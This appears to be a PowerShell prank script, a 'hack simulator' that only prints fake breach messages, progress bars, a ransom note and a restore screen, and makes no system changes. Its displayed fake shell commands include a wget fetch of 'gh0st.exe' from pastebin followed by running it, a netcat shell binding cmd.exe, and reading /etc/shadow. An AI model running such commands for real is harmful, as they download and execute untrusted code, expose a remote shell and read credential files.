# ================================================================
#  H A C K   S I M U L A T O R   //   GHOST PROTOCOL v1.0
#  github.com/sawaruto123/flipper-winsweep
#  For entertainment / movie purposes only. No actual changes.
# ================================================================

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "GHOST PROTOCOL // SYSTEM BREACH"
$Host.UI.RawUI.ForegroundColor = "Green"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

# ── Helper functions (same as original) ─────────────────────────
function W($t, $c="Green")  { Write-Host $t -ForegroundColor $c -NoNewline }
function WL($t, $c="Green") { Write-Host $t -ForegroundColor $c }
function NL  { Write-Host "" }
function HR  { WL ("═" * 78) "DarkGreen" }

function Glitch($final, $color="Green", $cycles=8) {
    $chars = "!@#%^&*<>?/\|~0123456789ABCDEF"
    $pos = $Host.UI.RawUI.CursorPosition
    for ($i=0; $i -lt $cycles; $i++) {
        $fake = -join ((1..$final.Length) | ForEach-Object { $chars[(Get-Random -Max $chars.Length)] })
        $Host.UI.RawUI.CursorPosition = $pos
        W $fake "DarkRed"
        Start-Sleep -Milliseconds 35
    }
    $Host.UI.RawUI.CursorPosition = $pos
    WL $final $color
}

function Format-FakeSize([long]$bytes) {
    if ($bytes -ge 1GB) { return "{0:N2} GB" -f ($bytes / 1GB) }
    if ($bytes -ge 1MB) { return "{0:N1} MB" -f ($bytes / 1MB) }
    return "$bytes B"
}

# ── Boot screen ─────────────────────────────────────────────────
Clear-Host
NL
WL "  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ██████╗ ██████╗  ██████╗ ████████╗ ██████╗  ██████╗ ██╗" "Green"
WL "  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║" "Green"
WL "  ██║  ███╗███████║██║   ██║███████╗   ██║       ██║   ██║██████╔╝██║   ██║   ██║   ██║   ██║██║   ██║██║" "Cyan"
WL "  ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██║   ██║██╔══██╗██║   ██║   ██║   ██║   ██║██║   ██║╚═╝" "Cyan"
WL "  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ╚██████╔╝██║  ██║╚██████╔╝   ██║   ╚██████╔╝╚██████╔╝██╗" "DarkGreen"
WL "   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═╝" "DarkGreen"
NL
HR
WL "  GHOST PROTOCOL v1.0      //      UNAUTHORIZED ACCESS TERMINAL" "DarkGray"
HR
NL

Start-Sleep -Milliseconds 400

# ── Boot log (fake kernel loading) ──────────────────────────────
$bootLines = @(
    @{tag="[BOOT] "; msg="Loading kernel modules..."; color="DarkGreen"},
    @{tag="[BOOT] "; msg="Initializing memory pools..."; color="DarkGreen"},
    @{tag="[NET]  "; msg="Establishing secure channel (TLS 1.3)..."; color="Cyan"},
    @{tag="[NET]  "; msg="Bypassing local firewall... [ OK ]"; color="Green"},
    @{tag="[AUTH] "; msg="Spoofing MAC address: 4A:3F:2E:1C:0B:99"; color="Yellow"},
    @{tag="[AUTH] "; msg="Injecting SSL certificate... [ ACCEPTED ]"; color="Green"},
    @{tag="[SCAN] "; msg="Probing internal network 192.168.1.0/24..."; color="DarkCyan"},
    @{tag="[SCAN] "; msg="Found 8 active hosts. Fingerprinting..."; color="Gray"},
    @{tag="[EXPL] "; msg="CVE-2026-4438 heap overflow exploit ready"; color="Red"},
    @{tag="[EXPL] "; msg="Privilege escalation... [ SUCCESS ]"; color="Green"},
    @{tag="[ROOT] "; msg="Access granted. UID=0 (root) on $(($env:COMPUTERNAME).ToUpper())"; color="Magenta"}
)

foreach ($line in $bootLines) {
    W "  $($line.tag)" $line.color
    foreach ($ch in $line.msg.ToCharArray()) {
        W $ch "Gray"
        Start-Sleep -Milliseconds (Get-Random -Min 5 -Max 15)
    }
    NL
    Start-Sleep -Milliseconds (Get-Random -Min 80 -Max 160)
}

NL; HR; NL

# ── Fake "hacking" progress bars ────────────────────────────────
function Fake-Bar($label, $max=100, $millis=800) {
    $filled = 0
    while ($filled -lt $max) {
        $inc = Get-Random -Min 3 -Max 15
        $filled = [math]::Min($max, $filled + $inc)
        $barLen = [int]($filled / 2)
        $bar = ("█" * $barLen) + ("░" * (50 - $barLen))
        Write-Host "`r  $label  [$bar] $filled%" -ForegroundColor Cyan -NoNewline
        Start-Sleep -Milliseconds (Get-Random -Min 20 -Max 60)
    }
    Write-Host ""
}

WL "  [INITIATING BREACH SEQUENCE]" "Yellow"
NL
Fake-Bar "Bypassing Windows Defender" 100
Fake-Bar "Extracting SAM hashes"      92
Fake-Bar "Cracking NTLMv2 (rainbow table)" 100
Fake-Bar "Establishing reverse shell" 100
NL

# ── Fake alert warnings (red text) ──────────────────────────────
WL "  [ALERT]  Unauthorized process detected: WINLOGON.EXE" "Red"
Start-Sleep -Milliseconds 500
WL "  [ALERT]  Firewall rule bypassed. Outbound connection on port 4444" "Red"
Start-Sleep -Milliseconds 600
WL "  [ALERT]  Antivirus real-time protection disabled (kernel callback removed)" "Red"
Start-Sleep -Milliseconds 800
WL "  [WARN]   Critical system files now accessible. Ransomware payload staged." "Yellow"
Start-Sleep -Milliseconds 1200

NL
Glitch "  >>> SYSTEM BREACH. FULL CONTROL ACQUIRED. <<<" "Red" 12
NL

# ── Fake terminal commands (user can see but not execute) ───────
WL "  [SHELL]  Type 'help' for available commands (simulated)" "DarkGreen"
NL

$fakeCommands = @(
    "root@$(($env:COMPUTERNAME).ToLower()):~# ps aux | grep -i defender",
    "root@$(($env:COMPUTERNAME).ToLower()):~# netstat -anop tcp | findstr LISTEN",
    "root@$(($env:COMPUTERNAME).ToLower()):~# cat /etc/shadow | base64 -d",
    "root@$(($env:COMPUTERNAME).ToLower()):~# wget http://pastebin.com/raw/gh0st.exe -O payload.exe",
    "root@$(($env:COMPUTERNAME).ToLower()):~# ./payload.exe --silent --install",
    "root@$(($env:COMPUTERNAME).ToLower()):~# nc -lvp 5555 -e cmd.exe"
)

foreach ($cmd in $fakeCommands) {
    W "  " "DarkGray"
    foreach ($ch in $cmd.ToCharArray()) {
        $col = if ((Get-Random -Max 2) -eq 0) { "White" } else { "Gray" }
        W $ch $col
        Start-Sleep -Milliseconds (Get-Random -Min 10 -Max 40)
    }
    NL
    Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 800)
}

NL; HR; NL

# ── Fake system info dump ───────────────────────────────────────
WL "  [INFO]  System enumeration complete." "Cyan"
NL
W "  COMPUTER NAME   : " "DarkGray"; WL ($env:COMPUTERNAME).ToUpper() "White"
W "  USER NAME       : " "DarkGray"; WL "SYSTEM" "White"
W "  OS VERSION      : " "DarkGray"; WL "Windows 11 24H2 (build 26200.8524)" "White"
W "  ARCHITECTURE    : " "DarkGray"; WL "x86_64 (Intel Core i7-1260P)" "White"
W "  DOMAIN          : " "DarkGray"; WL "WORKGROUP" "White"
W "  PUBLIC IP       : " "DarkGray"; 
$fakeIP = (Get-Random -Min 1 -Max 255).ToString() + "." + (Get-Random -Min 0 -Max 255) + "." + (Get-Random -Min 0 -Max 255) + "." + (Get-Random -Min 1 -Max 254)
WL $fakeIP "White"
W "  LOCAL IP        : " "DarkGray"; WL "192.168.1.104 (DHCP)" "White"
W "  MAC ADDRESS     : " "DarkGray"; WL "4A:3F:2E:1C:0B:99 (spoofed)" "Yellow"
W "  ADMIN ACCESS    : " "DarkGray"; WL "Yes (NT AUTHORITY\SYSTEM)" "Green"
NL

# ── Fake backdoor installation ──────────────────────────────────
WL "  [PERSIST]  Installing backdoor..." "Red"
Fake-Bar "Writing registry run key" 100
Fake-Bar "Injecting into svchost.exe" 100
Fake-Bar "Adding firewall exception" 100
NL

Glitch "  >>> BACKDOOR ACTIVE. PERSISTENT ACCESS GUARANTEED. <<<" "Red" 10
NL

# ── Fake data exfiltration (harmless text) ──────────────────────
WL "  [EXFIL]  Harvesting user data..." "Yellow"
$fakeData = @(
    "  → Browser passwords (Chrome): 23 entries",
    "  → WiFi profiles (SSID+Pass): 6 networks",
    "  → Telegram session tokens: 2 active",
    "  → Desktop screenshots: 4 captured",
    "  → Clipboard history: 11 items"
)
foreach ($line in $fakeData) {
    W $line.Substring(0,3) "DarkRed"
    W $line.Substring(3) "Gray"
    Start-Sleep -Milliseconds 200
    NL
}
NL

# ── Fake ransomware warning (scary but harmless) ────────────────
WL "  ***********************************************" "Red"
WL "  *   WARNING: YOUR FILES HAVE BEEN ENCRYPTED   *" "Red"
WL "  *   Send 0.5 BTC to bc1qxy2kgdygjrsqtzq2n0   *" "Red"
WL "  *   Decryption key will be sent after payment *" "Red"
WL "  ***********************************************" "Red"
Start-Sleep -Milliseconds 1500

# ── Fake decrypt sequence (quick recovery) ──────────────────────
WL ""
WL "  [DECRYPT]  Payment detected! Recovering files..." "Green"
Fake-Bar "Decrypting documents" 100
Fake-Bar "Restoring system integrity" 100
NL

Glitch "  >>> SYSTEM RESTORED. NO PERMANENT DAMAGE. STAY SAFE. <<<" "Green" 8
NL

# ── Exit message ────────────────────────────────────────────────
WL "  Press any key to exit this simulation." "DarkGray"
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")